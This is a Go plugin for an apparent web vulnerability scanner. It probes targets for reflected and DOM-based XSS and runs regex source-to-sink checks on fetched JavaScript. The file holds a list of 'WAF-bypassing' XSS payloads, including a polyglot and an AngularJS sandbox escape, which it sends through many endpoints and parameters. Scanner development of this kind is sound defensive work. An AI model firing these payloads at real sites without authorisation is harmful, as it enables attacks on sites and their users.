package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// ============================================================
//  XSS NEXT-GEN (V4.0)
// ============================================================

type XSSPlugin struct{}

func (p *XSSPlugin) Name() string { return "XSS (Next-Gen - Reflected & DOM)" }

// Precompile DOM XSS sink/source detection patterns
var (
	// Sources: things that read attacker-controlled input
	domXSSSourcePattern = regexp.MustCompile(
		`(?i)(location\.(hash|search|pathname|href)|document\.URL|document\.referrer|` +
			`window\.name|document\.cookie|localStorage\.|sessionStorage\.)`)

	// Sinks: dangerous functions/properties that can cause XSS
	domXSSSinkPattern = regexp.MustCompile(
		`(?i)(document\.write\s*\(|document\.writeln\s*\(|\.innerHTML\s*=|\.outerHTML\s*=|` +
			`eval\s*\(|setTimeout\s*\(|setInterval\s*\(|new\s+Function\s*\(|` +
			`\.src\s*=|\.href\s*=|\.action\s*=|import\s*\(|` +
			`\.insertAdjacentHTML\s*\(|\.setAttribute\s*\(\s*["']on|` +
			`\$\s*\(\s*location|jQuery\s*\(\s*location)`)

	// JS file detection pattern
	jsFilePattern = regexp.MustCompile(`(?i)href=["']([^"']+\.js[^"']*)["']|src=["']([^"']+\.js[^"']*)["']`)

	// UUID pattern for harvesting
	uuidRegex = regexp.MustCompile(`[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}`)
)

func (p *XSSPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	canary := fmt.Sprintf("dormxss%d", time.Now().UnixNano()%99999)

	// ================================================================
	// PHASE 1: REFLECTED XSS — Advanced Payload Arsenal
	// ================================================================
	// WAF-bypassing payloads organized by context
	payloads := []string{
		// Classic reflected
		fmt.Sprintf(`<script>alert('%s')</script>`, canary),
		fmt.Sprintf(`"><script>alert('%s')</script>`, canary),
		// HTML5 event handlers (WAF bypass)
		fmt.Sprintf(`"><img src=x onerror=alert('%s')>`, canary),
		fmt.Sprintf(`"><svg onload=alert('%s')>`, canary),
		fmt.Sprintf(`"><details open ontoggle=alert('%s')>`, canary),
		fmt.Sprintf(`"><body onpageshow=alert('%s')>`, canary),
		// Iframe src abuse
		fmt.Sprintf(`<iframe src=javascript:alert('%s')>`, canary),
		// Attribute context breakouts
		fmt.Sprintf(`"onmouseover="alert('%s')`, canary),
		fmt.Sprintf(`' onfocus='alert("%s")' autofocus='`, canary),
		// Javascript URI
		fmt.Sprintf(`javascript:/*-/*`+"`"+`/*\/*/'/*/"/**/(/* */onerror=alert('%s') )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('%s')//>\x3e`, canary, canary),
		// Template literal injection
		fmt.Sprintf("`-alert('%s')-`", canary),
		// Path traversal-based XSS (breaks relative path resolution)
		fmt.Sprintf(`../../%s<script>alert('%s')</script>`, canary, canary),
		fmt.Sprintf(`..%%2F..%%2F%s"><img src=x onerror=alert('%s')>`, canary, canary),
		// Null byte and comment injections
		fmt.Sprintf(`%%00<script>alert('%s')</script>`, canary),
		fmt.Sprintf(`<!--<img src=x onerror=alert('%s')>-->`, canary),
		// Unicode/encoding bypass
		fmt.Sprintf(`\u003cscript\u003ealert('%s')\u003c/script\u003e`, canary),
		// CSS injection context
		fmt.Sprintf(`</style><script>alert('%s')</script>`, canary),
		// AngularJS sandbox escape
		fmt.Sprintf(`{{constructor.constructor('alert("%s")')()}}`, canary),
	}

	// Smart character reflection probe — test if dangerous chars are filtered
	charProbe := fmt.Sprintf(`xss-probe-%s"'<>/&`, canary)

	endpoints := []string{
		"/", "/search", "/search.php", "/results.aspx", "/index.php",
		"/Search.aspx", "/find", "/lookup", "/query", "/filter",
	}
	params := []string{
		"q", "s", "search", "keyword", "query", "lang", "id", "msg",
		"term", "text", "name", "input", "value", "data", "url", "redirect",
		"callback", "next", "return", "page", "file", "path",
	}

	for _, ep := range endpoints {
		for _, param := range params {
			// --- Smart Character Probe first ---
			probeURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(charProbe))
			resp, err := client.Get(probeURL)
			if err != nil {
				continue
			}
			probeBody := readBody(resp, 32768)

			// If dangerous characters are NOT encoded in response → high confidence XSS
			if strings.Contains(probeBody, `"`) && strings.Contains(probeBody, `<`) &&
				strings.Contains(probeBody, canary) {
				return &models.Vulnerability{
					Target:      target,
					Name:        "Reflected XSS (Character Probe — Unfiltered)",
					Severity:    "HIGH",
					CVSS:        8.0,
					Description: fmt.Sprintf("Dangerous characters (< > \" ' /) are reflected unencoded in response body.\nThis confirms a strong XSS vulnerability without encoding protection.\nURL: %s?%s=%s\nParam: %s", baseURL+ep, param, charProbe, param),
					Solution:    "Apply context-aware output encoding. Use HTML entity encoding for HTML contexts, JS encoding for script contexts. Adopt a Content Security Policy (CSP).",
					Reference:   "https://owasp.org/www-community/attacks/xss/",
				}
			}

			// --- Full Payload Arsenal ---
			for _, payload := range payloads {
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))
				resp2, err2 := client.Get(targetURL)
				if err2 != nil {
					continue
				}
				body2 := readBody(resp2, 32768)

				if strings.Contains(body2, canary) {
					// Verify actual injection without encoding
					if containsXSSIndicator(body2) {
						return &models.Vulnerability{
							Target:      target,
							Name:        "Reflected XSS (Verified — Payload Executed)",
							Severity:    "HIGH",
							CVSS:        7.5,
							Description: fmt.Sprintf("XSS payload reflected and unencoded in response body.\nURL: %s\nParameter: %s\nPayload: %s", targetURL, param, payload),
							Solution:    "Implement context-aware output encoding. Deploy strict Content-Security-Policy headers.",
							Reference:   "https://owasp.org/www-community/attacks/xss/",
						}
					}
				}
			}
		}
	}

	// ================================================================
	// PHASE 2: SPIDER ENDPOINT INTEGRATION — GET & POST
	// ================================================================
	key := "endpoints_" + target.IP
	existing, ok := models.SharedData.Load(key)
	if ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if len(ep.Params) == 0 {
				continue
			}
			for _, param := range ep.Params {
				for _, payload := range payloads {
					var resp *http.Response
					var err error

					if ep.Method == "GET" {
						u, e := url.Parse(ep.URL)
						if e != nil {
							continue
						}
						q := u.Query()
						q.Set(param, payload)
						u.RawQuery = q.Encode()
						resp, err = client.Get(u.String())
					} else if ep.Method == "POST" {
						formData := url.Values{}
						formData.Set(param, payload)
						resp, err = client.PostForm(ep.URL, formData)
					}

					if err != nil || resp == nil {
						continue
					}
					body := readBody(resp, 32768)

					if strings.Contains(body, canary) && containsXSSIndicator(body) {
						return &models.Vulnerability{
							Target:      target,
							Name:        fmt.Sprintf("Reflected XSS (Spider-Discovered — %s)", ep.Method),
							Severity:    "HIGH",
							CVSS:        7.5,
							Description: fmt.Sprintf("XSS payload reflected on a %s parameter discovered by Spider.\nURL: %s\nParameter: %s\nPayload: %s", ep.Method, ep.URL, param, payload),
							Solution:    "Apply context-aware output encoding. Sanitize all user-controlled inputs server-side.",
							Reference:   "https://owasp.org/www-community/attacks/xss/",
						}
					}
				}
			}
		}
	}

	// ================================================================
	// PHASE 3: DOM XSS — Static JavaScript Bundle Analysis
	// ================================================================
	domResult := scanDOMXSS(client, baseURL, target)
	if domResult != nil {
		return domResult
	}

	return nil
}

// scanDOMXSS fetches the target page, discovers JS files, and statically
// analyses them for unsafe source-to-sink data flows.
func scanDOMXSS(client *http.Client, baseURL string, target models.ScanTarget) *models.Vulnerability {
	// Step 1: Fetch root page to discover linked JS files
	resp, err := client.Get(baseURL + "/")
	if err != nil {
		return nil
	}
	rootHTML := readBody(resp, 102400) // read up to 100KB

	// Collect JS file URLs from the page
	jsURLs := extractJSURLs(rootHTML, baseURL)
	if len(jsURLs) == 0 {
		return nil
	}

	// Limit to first 10 JS files to avoid excessive scanning
	if len(jsURLs) > 10 {
		jsURLs = jsURLs[:10]
	}

	for _, jsURL := range jsURLs {
		resp2, err2 := client.Get(jsURL)
		if err2 != nil {
			continue
		}
		jsSource := readBody(resp2, 524288) // read up to 512KB per JS file

		// Perform line-by-line source → sink analysis
		finding := analyzeJSForDOMXSS(jsSource, jsURL, target)
		if finding != nil {
			return finding
		}
	}

	return nil
}

// analyzeJSForDOMXSS performs static taint analysis on a JavaScript source.
// It checks if attacker-controlled sources (location.hash, location.search, etc.)
// flow into dangerous sinks (innerHTML, eval, document.write, etc.)
func analyzeJSForDOMXSS(source, jsURL string, target models.ScanTarget) *models.Vulnerability {
	lines := strings.Split(source, "\n")

	for i, line := range lines {
		// Check if line contains a source
		sourceMatch := domXSSSourcePattern.FindString(line)
		if sourceMatch == "" {
			continue
		}

		// Check same line for a sink (most common: single-line assignment)
		sinkMatch := domXSSSinkPattern.FindString(line)
		if sinkMatch != "" {
			snippet := strings.TrimSpace(line)
			if len(snippet) > 200 {
				snippet = snippet[:200] + "..."
			}
			return buildDOMXSSVuln(target, jsURL, sourceMatch, sinkMatch, i+1, snippet)
		}

		// Check surrounding lines (±5 lines) for proximity analysis
		startCtx := max0(i - 5)
		endCtx := i + 5
		if endCtx >= len(lines) {
			endCtx = len(lines) - 1
		}
		contextBlock := strings.Join(lines[startCtx:endCtx+1], "\n")

		sinkMatchCtx := domXSSSinkPattern.FindString(contextBlock)
		if sinkMatchCtx != "" {
			snippet := strings.TrimSpace(contextBlock)
			if len(snippet) > 300 {
				snippet = snippet[:300] + "..."
			}
			return buildDOMXSSVuln(target, jsURL, sourceMatch, sinkMatchCtx, i+1, snippet)
		}
	}

	return nil
}

func buildDOMXSSVuln(target models.ScanTarget, jsURL, source, sink string, lineNum int, snippet string) *models.Vulnerability {
	return &models.Vulnerability{
		Target:   target,
		Name:     "DOM XSS — Unsafe Source-to-Sink Data Flow (Static Analysis)",
		Severity: "HIGH",
		CVSS:     8.0,
		Description: fmt.Sprintf(
			"Static analysis of JavaScript bundle detected an attacker-controlled source flowing into a dangerous sink.\n\n"+
				"📄 File: %s\n"+
				"📍 Line: ~%d\n"+
				"🔴 Source (tainted input): %s\n"+
				"🎯 Sink (execution point): %s\n\n"+
				"Code Context:\n%s",
			jsURL, lineNum, source, sink, snippet,
		),
		Solution:  "Never pass user-controlled input (location.hash, location.search, etc.) directly to dangerous DOM manipulation functions. Use textContent instead of innerHTML. Implement a strict Content-Security-Policy.",
		Reference: "https://owasp.org/www-community/attacks/DOM_Based_XSS",
	}
}

// extractJSURLs parses an HTML body and returns absolute URLs of linked JS files.
func extractJSURLs(html, baseURL string) []string {
	matches := jsFilePattern.FindAllStringSubmatch(html, -1)
	seen := make(map[string]bool)
	var result []string
	for _, m := range matches {
		for _, g := range m[1:] {
			if g == "" {
				continue
			}
			g = strings.TrimSpace(g)
			if strings.HasPrefix(g, "//") {
				g = "https:" + g
			} else if strings.HasPrefix(g, "/") {
				g = baseURL + g
			} else if !strings.HasPrefix(g, "http") {
				g = baseURL + "/" + g
			}
			// Only include same-origin JS files
			if strings.Contains(g, strings.TrimRight(baseURL, "/")) {
				if !seen[g] {
					seen[g] = true
					result = append(result, g)
				}
			}
		}
	}
	return result
}

// containsXSSIndicator checks if the body contains unencoded XSS-relevant HTML.
func containsXSSIndicator(body string) bool {
	lower := strings.ToLower(body)
	return strings.Contains(lower, "<script") ||
		strings.Contains(lower, "<img") ||
		strings.Contains(lower, "<svg") ||
		strings.Contains(lower, "<iframe") ||
		strings.Contains(lower, "onerror=") ||
		strings.Contains(lower, "onload=") ||
		strings.Contains(lower, "ontoggle=") ||
		strings.Contains(lower, "javascript:")
}

// readBody reads the response body up to maxBytes and closes it.
func readBody(resp *http.Response, maxBytes int64) string {
	if resp == nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBytes))
	return string(b)
}

func max0(n int) int {
	if n < 0 {
		return 0
	}
	return n
}
